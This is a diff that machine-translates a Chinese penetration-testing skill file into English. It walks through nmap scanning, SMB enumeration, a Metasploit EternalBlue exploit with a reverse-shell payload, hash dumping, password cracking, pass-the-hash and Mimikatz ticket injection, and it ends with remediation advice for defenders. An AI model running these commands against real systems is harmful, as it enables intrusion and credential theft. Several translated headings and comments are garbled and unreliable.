@@ -1,233 +1,233 @@
 ---
 name: network-penetration-testing
-description: 网络渗透测试的专业技能和方法论
+description: Professional skills and methodology for network penetration testing
 version: 1.0.0
 ---
 
-# 网络渗透测试
+# Network penetration test
 
-## 概述
+## Overview
 
-网络渗透测试是评估网络基础设施安全性的重要环节。本技能提供网络渗透测试的方法、工具和最佳实践。
+Network penetration testing is an important part of assessing the security of the network infrastructure.
 
-## 测试范围
+## Test Scope
 
-### 1. 信息收集
+### 1. Information Gathering
 
-**检查项目：**
-- 网络拓扑
-- 主机发现
-- 端口扫描
-- 服务识别
+**Inspection items:**
+- Network Top
+- Host found it.
+- Port Scanning
+- Service recognition
 
-### 2. 漏洞扫描
+### 2. Vulnerability Scanning
 
-**检查项目：**
-- 系统漏洞
-- 服务漏洞
-- 配置错误
-- 弱密码
+**Inspection items:**
+- System Leaks
+- Service vulnerabilities
+- Security Misconfiguration
+- Weak Password
 
-### 3. 漏洞利用
+### 3. Vulnerability Exploitation
 
-**检查项目：**
-- 远程代码执行
-- 权限提升
-- 横向移动
-- 持久化
+**Inspection items:**
+- Remote Code Execution
+- Privilege Escalation
+- Lateral Movement
+- Persistence
 
-## 信息收集
+## Information Gathering
 
-### 网络扫描
+### Network Scanning
 
-**使用Nmap：**
+**Using Nmap:**
 ```bash
-# 主机发现
+# Host found it.
 nmap -sn 192.168.1.0/24
 
-# 端口扫描
+# Port Scan
 nmap -sS -p- 192.168.1.100
 
-# 服务识别
+# Service recognition
 nmap -sV -sC 192.168.1.100
 
-# 操作系统识别
+# Operational system recognition
 nmap -O 192.168.1.100
 
-# 完整扫描
+# Full scan
 nmap -sS -sV -sC -O -p- 192.168.1.100
 ```
 
-**使用Masscan：**
+**Using Masscan:**
 ```bash
-# 快速端口扫描
+# Quick Port Scan
 masscan -p1-65535 192.168.1.0/24 --rate=1000
 ```
 
-### 服务枚举
+### Service Equations
 
-**SMB枚举：**
+**SMB list:**
 ```bash
-# 枚举SMB共享
+# EnumerateSMBShare
 smbclient -L //192.168.1.100 -N
 
-# 枚举SMB用户
+# EnumerateSMBUser
 enum4linux -U 192.168.1.100
 
-# 使用nmap脚本
+# UsingnmapScript
 nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
 ```
 
-**RPC枚举：**
+**RPC examples:**
 ```bash
-# 枚举RPC服务
+# EnumerateRPCServices
 rpcclient -U "" -N 192.168.1.100
 
-# 使用nmap脚本
+# UsingnmapScript
 nmap --script rpc-enum 192.168.1.100
 ```
 
-**SNMP枚举：**
+**SNMP enumerates:**
 ```bash
-# SNMP扫描
+# SNMPScan
 snmpwalk -v2c -c public 192.168.1.100
 
-# 使用onesixtyone
+# Usingonesixtyone
 onesixtyone -c wordlist.txt 192.168.1.0/24
 ```
 
-## 漏洞扫描
+## Vulnerability Scanning
 
-### 使用Nessus
+### UsingNessus
 
 ```bash
-# 启动Nessus
-# 访问Web界面
-# 创建扫描任务
-# 分析扫描结果
+# StartNessus
+# AccessWebInterface
+# Create a scan task
+# Analyze the scan results
 ```
 
-### 使用OpenVAS
+### UsingOpenVAS
 
 ```bash
-# 启动OpenVAS
+# StartOpenVAS
 gvm-setup
 
-# 访问Web界面
-# 创建扫描任务
-# 分析扫描结果
+# AccessWebInterface
+# Create a scan task
+# Analyze the scan results
 ```
 
-### 使用Nmap脚本
+### Use Nmap scripts
 
 ```bash
-# 漏洞扫描
+# Lacuna scan.
 nmap --script vuln 192.168.1.100
 
-# 特定漏洞扫描
+# A specific bug scan.
 nmap --script smb-vuln-ms17-010 192.168.1.100
 
-# 所有脚本
+# All Scripts
 nmap --script all 192.168.1.100
 ```
 
-## 漏洞利用
+## Vulnerability Exploitation
 
 ### Metasploit
 
-**基础使用：**
+**Base use:**
 ```bash
-# 启动Metasploit
+# StartMetasploit
 msfconsole
 
-# 搜索漏洞
+# Search for holes
 search ms17-010
 
-# 使用模块
+# Use module
 use exploit/windows/smb/ms17_010_eternalblue
 
-# 设置参数
+# Set parameters
 set RHOSTS 192.168.1.100
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.10
 set LPORT 4444
 
-# 执行
+# Implementation
 exploit
 ```
 
-**后渗透：**
+**Post-infiltration:**
 ```bash
-# 获取系统信息
+# Access to system information
 sysinfo
 
-# 获取权限
+# Access permissions
 getsystem
 
-# 迁移进程
+# Migration process
 migrate <pid>
 
-# 获取哈希
+# Get Hashi.
 hashdump
 
-# 获取密码
+# Get Password
 run post/windows/gather/smart_hashdump
 ```
 
-### 常见漏洞利用
+### Common Leakage Utilization
 
-**EternalBlue：**
+**EternalBlue:**
 ```bash
-# 使用Metasploit
+# UsingMetasploit
 use exploit/windows/smb/ms17_010_eternalblue
 
-# 使用独立工具
+# Use stand-alone tools
 python eternalblue.py 192.168.1.100
 ```
 
-**BlueKeep：**
+**BlueKeep:**
 ```bash
-# 使用Metasploit
+# UsingMetasploit
 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 ```
 
-**SMBGhost：**
+**SMBGhost:**
 ```bash
-# 使用独立工具
+# Use stand-alone tools
 python smbghost.py 192.168.1.100
 ```
 
-## 横向移动
+## Lateral Movement
 
-### 密码破解
+### Decrypt
 
-**使用Hashcat：**
+**Using Hashcat:**
 ```bash
-# 破解NTLM哈希
+# DecryptNTLMHash
 hashcat -m 1000 hashes.txt wordlist.txt
 
-# 破解LM哈希
+# DecryptLMHash
 hashcat -m 3000 hashes.txt wordlist.txt
 
-# 使用规则
+# Use rules
 hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
 ```
 
-**使用John：**
+**Using John:**
 ```bash
-# 破解哈希
+# Break Hashi.
 john hashes.txt
 
-# 使用字典
+# Use Dictionary
 john --wordlist=wordlist.txt hashes.txt
 
-# 使用规则
+# Use rules
 john --wordlist=wordlist.txt --rules hashes.txt
 ```
 
 ### Pass-the-Hash
 
-**使用Impacket：**
+**Using Impacket:**
 ```bash
 # SMB Pass-the-Hash
 python smbexec.py -hashes :<hash> domain/user@target
@@ -239,165 +239,165 @@ python wmiexec.py -hashes :<hash> domain/user@target
 xfreerdp /u:user /pth:<hash> /v:target
 ```
 
-### 票据传递
+### Transfer of notes
 
-**使用Mimikatz：**
+**Using Mimikatz:**
 ```bash
-# 提取票据
+# Withdrawal of notes
 sekurlsa::tickets /export
 
-# 注入票据
+# Inject the notes.
 kerberos::ptt ticket.kirbi
 ```
 
-**使用Rubeus：**
+**Using Rubeus:**
 ```bash
-# 请求票据
+# Requesting papers
 Rubeus.exe asktgt /user:user /domain:domain /rc4:hash
 
-# 注入票据
+# Inject the notes.
 Rubeus.exe ptt /ticket:ticket.kirbi
 ```
 
-## 工具使用
+## Using the Tools
 
 ### Nmap
 
 ```bash
-# 完整扫描
+# Full scan
 nmap -sS -sV -sC -O -p- -T4 target
 
-# 隐蔽扫描
+# Hide Scan
 nmap -sS -T2 -f -D RND:10 target
 
-# UDP扫描
+# UDPScan
 nmap -sU -p- target
 ```
 
 ### Metasploit
 
 ```bash
-# 启动框架
+# Start Frame
 msfconsole
 
-# 数据库初始化
+# Database Initialization
 msfdb init
 
-# 导入扫描结果
+# Import Scan Results
 db_import nmap.xml
 
-# 查看主机
+# View Host
 hosts
 
-# 查看服务
+# View Services
 services
 ```
 
 ### Burp Suite
 
-**网络扫描：**
-1. 配置代理
-2. 浏览目标网络
-3. 分析流量
-4. 主动扫描
+**Web scan:**
+1. Configure Agent
+2. Browse target network
+3. Analysis of traffic
+4. Active Scan
 
-## 测试清单
+## Test Checklist
 
-### 信息收集
-- [ ] 网络拓扑发现
-- [ ] 主机发现
-- [ ] 端口扫描
-- [ ] 服务识别
-- [ ] 操作系统识别
+### Information Gathering
+- [ ] I found it on the Internet.
+- [ ] Host found it.
+- [ ] Port Scanning
+- [ ] Service recognition
+- [ ] Operational system recognition
 
-### 漏洞扫描
-- [ ] 系统漏洞扫描
-- [ ] 服务漏洞扫描
-- [ ] 配置错误检查
-- [ ] 弱密码检查
+### Vulnerability Scanning
+- [ ] System Gap Scanning
+- [ ] Service vulnerability scanning
+- [ ] Configure Error Check
+- [ ] Weak password check
 
-### 漏洞利用
-- [ ] 远程代码执行
-- [ ] 权限提升
-- [ ] 横向移动
-- [ ] 持久化
+### Vulnerability Exploitation
+- [ ] Remote Code Execution
+- [ ] Privilege Escalation
+- [ ] Lateral Movement
+- [ ] Persistence
 
-## 常见安全问题
+## Common Security Issues
 
-### 1. 未打补丁的系统
+### 1. System without patches
 
-**问题：**
-- 系统未及时更新
-- 存在已知漏洞
-- 补丁管理不当
+**Question:**
+- System not updated in time
+- There are known loopholes.
+- Mismanagement of patches
 
-**修复：**
-- 及时安装补丁
-- 建立补丁管理流程
-- 定期安全更新
+**Repairs:**
+- Install patches in a timely manner
+- Create patch management process
+- Apply security updates regularly
 
-### 2. 弱密码
+### 2. Weak Password
 
-**问题：**
-- 默认密码
-- 简单密码
-- 密码重用
+**Question:**
+- Default password
+- Simple password
+- Password Reuse
 
-**修复：**
-- 实施强密码策略
-- 启用多因素认证
-- 定期更换密码
+**Repairs:**
+- Implement a strong password policy
+- Enable multifactor authentication
+- Change passwords on a regular basis
 
-### 3. 开放端口
+### 3. Open Port
 
-**问题：**
-- 不必要的端口开放
-- 服务暴露
-- 防火墙配置错误
+**Question:**
+- Unnecessary port open
+- Service exposure
+- Firewall Configuration Error
 
-**修复：**
-- 关闭不必要端口
-- 实施防火墙规则
-- 使用VPN访问
+**Repairs:**
+- Close unnecessary port
+- Implementation of firewall rules
+- Access with VPN
 
-### 4. 配置错误
+### 4. Security Misconfiguration
 
-**问题：**
-- 默认配置
-- 权限过大
-- 服务配置不当
+**Question:**
+- Default Configuration
+- Too much permission.
+- Inappropriate service allocation
 
-**修复：**
-- 安全配置基线
-- 最小权限原则
-- 定期配置审查
+**Repairs:**
+- Security configuration baseline
+- Principle of Least Privilege
+- Periodic configuration review
 
-## 最佳实践
+## Best Practices
 
-### 1. 信息收集
+### 1. Information Gathering
 
-- 全面扫描
-- 多工具验证
-- 记录发现
-- 分析结果
+- Full Scan
+- Multitool Authentication
+- Record found.
+- Analysis Results
 
-### 2. 漏洞利用
+### 2. Vulnerability Exploitation
 
-- 授权测试
-- 最小影响
-- 记录操作
-- 及时清理
+- Authorized Testing
+- Minimum impact
+- Record the Actions
+- Timely clean-up
 
-### 3. 报告编写
+### 3. Preparation of the report
 
-- 详细记录
-- 风险评级
-- 修复建议
-- 验证步骤
+- Detailed records
+- Risk rating
+- Remediation Recommendations
+- Verification Steps
 
-## 注意事项
+## Important Notes
 
-- 仅在授权环境中进行测试
-- 避免对生产系统造成影响
-- 遵守法律法规
-- 保护测试数据
+- Test only in an authorized environment
+- Avoid impact on production systems
+- Comply with Applicable Laws and Regulations
+- Protect test data
